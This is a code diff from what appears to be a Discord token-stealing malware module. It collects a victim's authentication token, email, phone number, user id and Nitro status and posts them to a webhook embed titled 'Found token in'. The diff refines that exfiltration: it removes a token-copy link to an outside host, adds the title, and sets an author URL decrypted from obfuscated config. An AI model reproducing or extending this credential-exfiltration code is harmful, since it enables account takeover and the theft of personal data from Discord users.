@@ -155,7 +155,7 @@ module.exports = (client) => {
                     "source": source,
                     "id": req.data.id,
                     "username": `${req.data.username}#${req.data.discriminator}`,
-                    "phone": req.data.phone,                "phone": req.data.phone,
+                    "phone": req.data.phone,
                     "email": req.data.email,
                     "locale": req.data.locale,
                     "nitro": this.getNitro(req.data.premium_type),
@@ -173,7 +173,7 @@ module.exports = (client) => {
                     "<:1336:1026133487364874321>": source,
                     "<:1336:1012707970653626408> Email:": req.data.email,
                     "<:1336:1012707773424865310> Phone": req.data.phone,
-                    "<a:1336:1012706914527891476> Token:": `${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`
+                    "<a:1336:1012706914527891476> Token:": token
                     })) {
                     fields.push({
                         name: key,
@@ -185,13 +185,15 @@ module.exports = (client) => {
                 await client.utils.webhook.sendToWebhook(
                     {
                         "embeds": [client.utils.webhook.createEmbed({
+                            "title": `Found token in: ${source}`,
                             "fields": fields,
                             "thumbnail": {
                                 "url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                             },
                             "author": {
                                 "name": `${req.data.username}#${req.data.discriminator} (${req.data.id})`,
-                                "icon_url": `https://cdn.discordapp.com/attachments/1019867803349680168/1026121367764082769/a_721d6729d0b5e1a8979ab7a445378e9a.gif`
+                                "url": client.utils.encryption.decryptData(client.config.embed.href),
+                                "icon_url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                             },
                         })],
                     })
